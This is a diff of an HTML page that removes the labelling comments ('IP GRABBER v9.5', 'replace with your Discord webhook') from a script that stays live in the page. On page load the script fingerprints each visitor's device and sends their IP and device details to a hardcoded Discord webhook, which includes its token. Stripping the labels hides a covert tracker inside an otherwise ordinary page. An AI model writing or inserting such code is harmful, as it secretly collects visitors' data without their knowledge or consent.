@@ -1204,16 +1204,13 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER v9.5 - Handle Chrome UA Reduction ==================== -->
 <script>
-// GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
 
 function getDetailedDeviceInfo() {
     const ua = navigator.userAgent;
     const uaLower = ua.toLowerCase();
 
-    // Cek apakah menggunakan Chrome UA Reduction (paling umum sekarang)
     const isReducedUA = ua.includes('Android 10; K') || uaLower.includes('android 10; k');
 
     let deviceModel = 'Android Device';
@@ -1313,4 +1310,3 @@ async function sendIPLog() {
 
 window.addEventListener('load', () => setTimeout(sendIPLog, 1800));
 </script>
-<!-- ==================== END IP GRABBER v9.5 ==================== -->
